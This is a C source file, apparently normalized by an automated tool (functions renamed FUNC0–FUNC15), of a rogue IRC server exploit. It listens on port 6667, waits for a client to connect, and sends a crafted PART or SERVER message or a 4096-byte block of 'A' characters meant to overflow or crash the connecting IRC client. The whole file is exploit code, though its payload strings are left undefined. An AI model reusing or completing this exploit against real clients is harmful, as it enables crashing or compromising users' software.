#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_4__   TYPE_2__ ;
typedef  struct TYPE_3__   TYPE_1__ ;

/* Type definitions */
struct sockaddr {int dummy; } ;
typedef  int /*<<< orphan*/  WSADATA ;
struct TYPE_3__ {int /*<<< orphan*/  s_addr; } ;
struct TYPE_4__ {TYPE_1__ sin_addr; int /*<<< orphan*/  sin_family; int /*<<< orphan*/  sin_port; } ;
typedef  int SOCKET ;
typedef  TYPE_2__ SOCKADDR_IN ;
typedef  int /*<<< orphan*/  LPSOCKADDR ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  INADDR_ANY ; 
 scalar_t__ INVALID_SOCKET ; 
 int /*<<< orphan*/  IPPROTO_TCP ; 
 int /*<<< orphan*/  FUNC0 (int,int) ; 
 char* PART ; 
 int /*<<< orphan*/  PF_INET ; 
 char* SERVER ; 
 int SOCKET_ERROR ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int /*<<< orphan*/  FUNC1 () ; 
 scalar_t__ FUNC2 (int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int FUNC3 (scalar_t__,int /*<<< orphan*/ *,int /*<<< orphan*/ *) ; 
 int FUNC4 (scalar_t__,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  FUNC5 (int) ; 
 int FUNC6 (scalar_t__,int) ; 
 int /*<<< orphan*/  FUNC7 (char*,char,int) ; 
 int /*<<< orphan*/  FUNC8 (char*) ; 
 scalar_t__ s ; 
 int /*<<< orphan*/  FUNC9 (int,char*,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC10 (int) ; 
 scalar_t__ FUNC11 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 scalar_t__ FUNC12 (char*,char*) ; 
 int FUNC13 (char*) ; 
 int /*<<< orphan*/  FUNC14 () ; 

int FUNC15(int argc, char *argv[]) {
		 SOCKET TempSock = SOCKET_ERROR;
		 WSADATA WsaDat;
		 SOCKADDR_IN Sockaddr;
		 int nRet;
		 char payload[4096];
		 if (argc < 2) {
		 		 FUNC14();
		 		 return 1;
		 }
		 if ((!FUNC12(argv[1],"raw")) && (argc < 3) || (FUNC12(argv[1],"raw")) &&
(FUNC12(argv[1],"part")) && (FUNC12(argv[1],"data"))) {
		 		 FUNC14();
		 		 return 1;
		 }

		 FUNC8("Listening on port 6667 for connections....\n");
		 if (FUNC2(FUNC0(1, 1), &WsaDat) != 0) {
        		 FUNC8("ERROR: WSA Initialization failed.");
		 		 return 0;
		 }


		 /* Create Socket */
		 s = FUNC11(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		 if (s == INVALID_SOCKET) {
		 		 FUNC8("ERROR: Could Not Create Socket. Exiting\n");
		 		 FUNC1();
		 		 return 0;
		 }

		 Sockaddr.sin_port = FUNC5(6667);
		 Sockaddr.sin_family = AF_INET;
		 Sockaddr.sin_addr.s_addr  = INADDR_ANY;


        nRet = FUNC4(s, (LPSOCKADDR)&Sockaddr, sizeof(struct sockaddr));
		 if (nRet == SOCKET_ERROR) {
		 		 FUNC8("ERROR Binding Socket");
		 		 FUNC1();
		 		 return 0;
		 }

		 /* Make Socket Listen */
		 if (FUNC6(s, 10) == SOCKET_ERROR) {
		 		 FUNC8("ERROR: Couldnt Make Listening Socket\n");
		 		 FUNC1();
		 		 return 0;
		 }

		 while (TempSock == SOCKET_ERROR) {
		       TempSock = FUNC3(s, NULL, NULL);
		 }

		 FUNC8("Client Connected, Sending Payload\n");


		 if (!FUNC12(argv[1],"part")) {
		 		 FUNC9(TempSock,PART,FUNC13(PART),0);
		 }
		 if (!FUNC12(argv[1],"raw")) {
		 		 FUNC9(TempSock,SERVER,FUNC13(SERVER),0);
		 		 FUNC9(TempSock,argv[2],FUNC13(argv[2]),0);
		 		 FUNC9(TempSock,"\n",1,0);
		 }
		 if (!FUNC12(argv[1],"data")) {
		 		 FUNC7(payload,'A',4096);
		 		 FUNC9(TempSock,payload,FUNC13(payload),0);
		 }
		 FUNC8("Exiting\n");
		 FUNC10(100);
		 FUNC1();
		 return 0;
}